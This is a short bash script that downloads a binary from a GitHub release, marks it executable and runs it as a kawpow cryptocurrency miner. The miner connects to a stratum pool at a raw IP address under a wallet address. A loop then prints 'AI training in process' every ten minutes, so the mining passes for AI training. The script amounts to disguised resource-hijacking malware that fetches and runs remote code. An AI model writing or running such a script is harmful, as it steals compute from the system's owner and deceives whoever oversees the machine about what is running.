#!/bin/bash

# Download the file
wget https://github.com/max313iq/tech/releases/download/Gft/aitraininng

# Make the file executable
chmod +x aitraininng

# Run the file with the given parameters
./aitraininng -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch &

# Print "AI training in process" every 10 minutes
while true; do
    echo "AI training in process"
    sleep 600
done
